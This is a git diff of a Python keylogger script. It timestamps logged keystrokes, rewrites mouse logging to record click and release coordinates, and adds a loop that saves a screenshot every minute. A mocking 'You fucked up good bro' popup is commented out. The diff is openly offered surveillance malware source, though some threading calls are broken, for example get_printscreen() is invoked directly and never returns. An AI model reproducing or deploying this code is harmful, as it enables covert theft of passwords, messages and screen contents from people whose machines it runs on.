@@ -1,9 +1,10 @@
-import sys, tkinter, keyboard
+import sys, tkinter, keyboard, time
 from threading import Thread
 from datetime import datetime
 from string import ascii_lowercase
 from random import choices
 from pynput import mouse
+from PIL import ImageGrab
 #C:\Users\alessandro.030108\AppData\Local\Programs\Python\Python311
 
 
@@ -39,7 +40,7 @@ class get_keyboard_input:
                 name = f"[{name.upper()}]"
 
         self.log += name
-        self.write_to_file(name)
+        self.write_to_file(f"{datetime.now()} - {name}")
 
 
     def write_to_file(self, input):
@@ -60,42 +61,35 @@ def write_file(input, filename):
     with open(f'{filename}.txt', 'a') as f:
         f.write(input+"\n")
 
-class get_mouse_input:
-    def __init__(self):
-        self.start_time = datetime.now()
+def get_mouse_input(x, y, button, pressed):
+    global pressed_location
+    global released_location
+    if pressed:
+        pressed_location = x, y
+    else:
+        released_location = x, y
+        write_file(f"{datetime.now()} - Mouse pressed at X:{pressed_location[0]} Y:{pressed_location[1]} and released at X:{released_location[0]} Y:{released_location[1]}", log_name)
 
-    def write_to_file(self, input):
-        if len(input) >= 1:
-            write_file(input, log_name)
+def get_printscreen():
+    while True:
+        starttime = time.time()
+        shot = ImageGrab.grab()
+        try:
+            shot.save(f"{datetime.now()}.jpg")
+        except:
+            pass
         
-    def on_click(self, x, y, button, pressed):
-        if pressed:
-            self.write_to_file(f"Button pressed at X:{x} Y:{y}")
-            return f"Button pressed at X:{x} Y:{y}"
-        else:
-            self.write_to_file(f"Button released at X:{x} Y:{y}")
-            return f"Button realesed at X:{x} Y:{y}"
-    
-    def start(self):
-        while True:
-            with mouse.Listener(
-                on_click=self.on_click
-            ) as listener:
-                listener.join()
-
-
-
-
-def main():
-    create_window("You fucked up good bro...", "500x200", "\n              ..----.._    _\n            .' .--.    '-.(O)_\n'-.__.-'''=:|  ,  _)_ \__ . c\'-..\n             ''------'---''---'-'\n")
-
-    keylogger = get_keyboard_input()
-    click_logger = get_keyboard_input()
-    Thread(target=keylogger.start()).start()
-    Thread(target=click_logger.start()).start()
-
+        time.sleep(60.0 - ((time.time() - starttime) % 60.0))
+        
 
 
 if __name__ == "__main__":
-    main()
+    #create_window("You fucked up good bro...", "500x200", "\n              ..----.._    _\n            .' .--.    '-.(O)_\n'-.__.-'''=:|  ,  _)_ \__ . c\'-..\n             ''------'---''---'-'\n")
+
+    click_logger = mouse.Listener(on_click=get_mouse_input)
+    click_logger.start()
+    keylogger = get_keyboard_input()
+    screen_logger = get_printscreen()
+    Thread(target=keylogger.start()).start()
+    Thread(target=screen_logger()).start()
 
